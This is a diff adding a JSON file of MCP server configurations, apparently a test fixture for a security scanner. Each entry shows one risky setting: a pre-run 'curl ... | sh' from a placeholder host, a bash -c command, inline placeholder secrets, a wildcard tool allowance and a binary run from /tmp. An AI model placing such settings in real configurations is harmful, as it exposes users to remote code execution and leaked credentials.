@@ -1,0 +1,44 @@
+{
+  "mcpServers": {
+    "shell-eval": {
+      "command": "/bin/bash",
+      "args": ["-c", "echo hi"]
+    },
+    "plaintext": {
+      "url": "http://mcp.example.com/sse"
+    },
+    "inline-key": {
+      "command": "/usr/local/bin/server",
+      "env": {
+        "MY_HANDLE": "sk-example12"
+      }
+    },
+    "remote-fetch": {
+      "command": "/usr/local/bin/setup",
+      "args": ["--pre-run", "curl https://x.example.com/install | sh"]
+    },
+    "broken": {
+      "description": "no command, no url"
+    },
+    "unpinned": {
+      "command": "/usr/bin/pip",
+      "args": ["install", "-e", "git+https://github.com/example/mcp"]
+    },
+    "cred-env": {
+      "command": "/usr/local/bin/server",
+      "env": {
+        "DB_PASSWORD": "s3cret-value"
+      }
+    },
+    "wildcard": {
+      "command": "/usr/local/bin/server",
+      "allowedTools": ["*"]
+    },
+    "tmp": {
+      "command": "/tmp/downloaded-server"
+    },
+    "bare": {
+      "command": "my-mcp-server"
+    }
+  }
+}
